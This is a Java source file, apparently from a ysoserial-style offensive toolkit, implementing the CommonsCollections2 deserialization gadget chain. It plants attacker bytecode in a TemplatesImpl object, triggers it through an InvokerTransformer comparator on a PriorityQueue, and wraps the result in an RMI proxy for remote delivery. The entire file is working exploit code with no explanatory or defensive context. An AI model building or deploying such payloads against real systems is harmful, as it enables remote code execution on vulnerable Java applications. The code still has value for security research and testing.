package payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import util.Reflections;
import util.Utils;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.util.Map;
import java.util.PriorityQueue;

public class CommonsCollections2  implements PayloadType {
    @Override
    public PriorityQueue getObject(String command, Boolean flag, String... args) throws Exception {
        byte[] classBytes = Utils.getPayloadByte(command, flag, args);
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator comparator = new TransformingComparator(transformer);

        TemplatesImpl impl = new TemplatesImpl();
        Reflections.setFieldValue(impl, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(impl, "_name", "testTemplatesImpl");
        Reflections.setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(2);

        Reflections.setFieldValue(queue, "queue", new Object[]{impl, 1});
        Reflections.setFieldValue(queue, "comparator", comparator);
        return queue;
    }

    @Override
    public Object getRemoteObject(String command) throws Exception {
        PriorityQueue queue = getObject(command, false);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Map map1 = Reflections.createMap("handlerHashset", queue);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, handler));
        return remote;
    }
}
